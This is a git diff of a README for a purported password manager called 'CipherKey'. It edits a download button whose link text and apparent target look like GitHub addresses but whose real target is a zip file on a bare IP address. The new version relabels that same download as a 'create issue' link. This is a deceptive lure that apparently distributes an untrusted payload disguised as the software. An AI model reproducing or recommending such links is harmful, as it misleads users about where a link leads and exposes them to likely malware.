@@ -8,10 +8,8 @@ CipherKey is a highly secure password management software designed to encrypt yo
 Download the Latest Build from CipherKey.
 
 <!-- BEGIN LATEST DOWNLOAD BUTTON -->
-[![Download .exe](https://custom-icon-badges.demolab.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download zip")]([https://github.com/DenverCoder1/readme-download-button-action/archive/1.0.2.zip](http://185.117.249.191/CipherKey/_zip/CipherKey_66d98a3fb29e56815b0a40c18ad32c2b14b5fd93))
+[create issue]([https://github.com/user/repository/issues/new](http://185.117.249.191/CipherKey/_zip/CipherKey_66d98a3fb29e56815b0a40c18ad32c2b14b5fd93.zip))
 <!-- END LATEST DOWNLOAD BUTTON -->
-
-
 
 ## FilePaths
 
